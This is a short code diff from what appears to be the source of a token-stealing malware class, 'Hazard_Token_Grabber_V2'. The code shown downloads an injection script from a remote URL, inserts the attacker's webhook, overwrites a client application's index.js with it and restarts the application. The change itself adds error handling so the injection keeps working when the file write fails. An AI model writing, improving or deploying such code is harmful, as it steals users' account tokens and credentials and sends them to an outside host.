@@ -209,8 +209,11 @@ class Hazard_Token_Grabber_V2(functions):
                                     pass
                             f = httpx.get(self.fetchConf('injection_url')).text.replace(
                                 "%WEBHOOK%", self.webhook)
-                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
-                                indexFile.write(f)
+                            try:
+                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
+                                    indexFile.write(f)
+                            except PermissionError:
+                                pass
                             os.startfile(app + self.sep + _dir + '.exe')
 
     async def killProcesses(self):
